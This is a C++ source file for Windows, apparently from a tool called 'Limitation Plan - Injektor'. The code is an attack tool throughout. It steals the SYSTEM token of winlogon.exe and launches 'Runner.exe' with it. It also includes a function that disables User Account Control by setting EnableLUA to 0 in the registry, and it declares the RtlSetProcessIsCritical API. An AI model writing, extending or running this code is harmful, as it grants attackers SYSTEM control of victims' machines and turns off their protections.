#include <iostream>
#include <iomanip>
#include "RegManage.h"
#include "WINAPICaller.h"
#include "WINAPIDllFunc.h"

using std::cout;
using std::wcout;
using std::endl;
using std::hex;

WINAPICaller caller;
fnRtlSetProcessIsCritical SetProcCritical;

LRESULT cancelUACBox() {
	RegManage manage = RegManage(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"));
	LRESULT res = manage.setDword(TEXT("EnableLUA"), 0);
	return res;
}

void START() {
	cout << "Limitation Plan - Injektor" << endl;
	cout << "Start injecting..." << endl;
}
int main() {
	
	caller.AdjustCurrentPrivilege();
	DWORD procSessId = caller.getProcessSessionId(TEXT("winlogon.exe"));
	cout << "Found WINLOGON.exe's MID:" << procSessId << endl;
	HANDLE target;

	cout << "STARTING to get SYSTEM Privilege,please wait..." << endl;
	DWORD res = caller.DuplicateProcessToken(procSessId,&target);

	cout << "STARTING to run Runner.exe,please wait..." << endl;
	DWORD c = caller.WCreateProcessWithToken(target, L"Runner.exe");
	cout << "Completed.Now Injektor will quit soon."  << endl;
	system("pause");
	return 0;
}